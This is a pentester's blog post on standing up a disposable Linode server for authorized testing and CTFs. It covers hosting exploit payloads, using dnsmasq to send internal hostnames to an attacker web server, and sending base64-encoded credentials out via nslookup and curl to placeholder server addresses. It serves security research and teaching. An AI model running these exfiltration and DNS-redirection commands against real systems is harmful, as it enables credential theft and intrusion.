---
title: "Dynamic Public Cloud Server for the Win"
date: 2020-01-03 09:00:00 +0000
layout: post
author: OverCast
twitter: "https://twitter.com/DefCon864"
permalink: blog/dynamic-public-cloud-server-ftw.html
tags: [cloud, dns, intercept traffic, CTF, Linode]
---
> This is for the pirates who clap
> And love the sound
> Attacking from the cloud
> Then we're back and underground
~ Dual Core, All The Things

TL;DR.
  - Prevent your home IP from being banned
  - Simple, cheap Linux server with dynamic, public IP address
  - Route DNS, HTTP, TLS, or other traffic you want to intercept
  - Host services needed for research, CTF, or pentest engagement

# Overview
There are many reasons why masking your traffic is important.  One specific case relates to the tasks we perform during an authorized hack or researching a potential vulnerability.  Scanning, trial 'n error discovery and exploitation can generate lots of traffic which can lead to your home IP address finding its way on one or more black lists.  Getting a new public IP address for su casa is a pain in the neck while your family enjoys the throwback non-Internet lifestyle of 1985.  

I recently needed to run several external public services but did not want to open any holes in my home perimiter or stand up a domain.  Those would be overkill to validate what I was researching, validate data exfiltration and perimiter leak vulnerabilities.  My requirements are simply: a dynamic public IP address in the wild to host DNS and web servers, SSH access to inspect DNS and TLS traffic.  This would work for any online CTF or pentest engagement where you want to validate the targets ability to communicate external to the organization.

The solution I went with -and it worked really well- was to spin up a [Linode Nanode server](https://www.linode.com/products/nanodes/).  The full engagement cost only $0.09 for 10 hours of system uptime.  In many respects this write-up is cloud vendor agnostic.  While I use [Linode](https://www.linode.com) here you can follow the same steps on a different provider with minor variation.

 __*Warning:*__  This is not a replacement for a proper VPN or Tor usage (proxychains).  It is a quick 'n fast means with little commitment to separate my public IP from the equation.

## Setup
Signing up for the cloud provider is a straight forward process.  No surprises here.  Creating a Nanode is just two steps:
1. Under the __Linode__ menu option Click __Create a Linode__

    ![create](/images/overcast/dynamic-public-cloud-server-ftw/01-create-a-nanode.png){:height="50%" width="50%"}

2. Define your settings
* Pick a __distro__
* Select a __Region__
* __Be careful of the default!__  Under Linode Plan select the __Nanode__ tab and pick the only option at the hourly rate of $0.0075.  The default, Standard plans are more expensive.
* Don't worry about the label and tags.  This system does not have Spock's blessing; it won't live long.
* Set your SSH keys or a root password for connecting.
* Click __Create__

    ![settings](/images/overcast/dynamic-public-cloud-server-ftw/02-nanode-settings.png){:height="50%" width="50%"}

Once you click the create button it takes a few seconds for the new box to provision and boot.  The __Summary__ page lists the IPv4 and IPv6 addresses.

![boot](/images/overcast/dynamic-public-cloud-server-ftw/03-boot.png){:height="50%" width="50%"}

Two console web shells options are provided by Linode (Weblish and Glish) but you'll want to use your own SSH session from your box.  Once you gain SSH access you can do all the normal sysadmin things to scaffold your platform.  I was raised by graybeards so the lack of maintaining tools such as netstat and ifconfig is disconcerting to say the least.  Yet I will resist the urge to install net-tools.  This host is bare bones right now so let's add what we need.

```bash
apt-get -y update
apt-get -y install nmap socat dnsmasq tcpdump
```

For those wondering, at this point your network transfer usage will be around 94 kb.  If you run an apt-get -y upgrade that number will change.

## So what can I do with this?  Here are some sample scenarios.
### Scan Your Home Public IP Address
You now have an external point of presence.  Why not take a look at how the world sees you?  This is probably one of the most practical scenarios for anyone in IT.  It's always a good idea to get a street view of your home network.  Anything unexpected showing up?
```nmap -T3 -sC -sV -Pn -p1-65535 HOME_IP```

### Public Web Server for Exploits
The simplest solution, host a temporary web server to test or exploit a vulnerability.  In this case the Nanode server runs python's SimpleHTTPServer hosting a desired payload.
```bash
mkdir badweb
cd badweb
echo "my bad payload for exploiting CSRF or some such vector" > payload.html
```
Start the web server to serve up those delicious payloads of wonder.

```bash
python -m SimpleHTTPServer 80
```

Or install Apache and operate out of /var/www/html.  The researcher triggers the vulnerability causing the target to call the Nanode web server's payload.  If this lights up a sysadmin radar or triggers a ban, no worries, destroy this nanode and start over.

### DNS Server
Name resolution plays an important role on a network.  If a network has improper egress filtering DNS can be used for exfiltration or to route internal targets to exploits hosted on your web server.  In my case I had control of the resolution process and wanted to route internal web server requests to my public web server.

On the nanode edit __/etc/dnsmasq.conf__:
* Uncomment the "__#no-resolv__" line (around line 54) so that your DNS server won't send requests upstream.
* Uncomment and modify line 131 to point to your local file for dnsmasq host resolution instead of /etc/hosts.
    ```addn-hosts=/etc/dnsmasq.hosts```
* Create the __/etc/dnsmasq.hosts__ file and set your bad web server IP address (eg. 1.2.3.4) to the hostname of the internal good web server.  This will resolve the good web server name to your bad web server.
```BAD_WEB_SERVER_IP    goodwebserver.company.com```

The addn-host file (dnsmasq.hosts) can be named anything and has the same content format as /etc/hosts.  Be aware though Linux can default to running its preinstalled dnsmasq as a service.  So if you attempt to start manually it will throw errors.  If you want greater control the default service can be stopped ```service dnsmasq stop``` and run manually, or in the background with &, ```dnsmasq --no-daemon --log-queries --log-facility=/var/log/dnsmasq.log```.  When not run in the background (or without tcpdump) the log file can be tailed to show any DNS queries ```tail -f /var/log/dnsmasq.log``` or parsed by one of your amazing scripts.

### Inspect Traffic
```tcpdump udp port 53 or tcp port 80 or tcp port 443```
For more verbosity use ```-v``` or ```-vv``` for a flood of connection information.  When you are in security researcher mode it helps to limit the scope to the specific protocol and port being evaluated.  This prevents unnecessary noise and keeps the content concise for the write-up.

If you have data to exfiltrate, such as ```echo "user:admin;pass:pfi9503" | base64 | sed 's/=//g'```, send it to your DNS server.

```bash
nslookup dXNlcjphZG1pbjtwYXNzOnBmaTk1MDMK NANODE_DNS_IP_ADDRESS
```

Your DNS server or tcpdump shows the query which you know to be base64 encoded.  When decoded this reveals not a hostname but the internal data ```user:admin;pass:pfi9503```.

Or if you only control a remote web server you can pull similar method from its logs by sending a request with the encoded data to exfiltrate.

```bash
curl https://NANODE_IP_ADDRESS/superfuntime/dXNlcjphZG1pbjtwYXNzOnBmaTk1MDMK
```

I use superfuntime as a control check for a script parsing the web log file to know when to decode.  It's not an actual directory or route and keeps the script from parsing any Internet noise. 

For the blue teamers among us this may be a great listening post to research the noise.

### Public CTF Box for DEF CON Group Meetings
Several of us are neck deek in CTF creation land (sounds like a new Nintendo title -- I'd play that) which led me to think of another use case.  Now that our meetings are both IRL and online this could be an interesting scenario for future DC864 meetings.  Instead of just having a CTF / vulnerable learning target on-site we can host it on a Nanode for both local and remote participants to use.  To reduce the traffic I'll probably pre-recon the box and provide it to the participants.  So if we cover a specific vector it can be the focus of the target and talk.  Even though there is a muscle memory learning benefit from recon to exploit to privelege escalation, etc. being hyper focused during meetings (eg. SQLi, LFI, etc.) could be a good thing.  Need to put a bit more brainery into this area before release so stay tuned or contribute ideas as you see fit.  Either way, we have no shortage of CTF options right now.

Happy hacking everyone.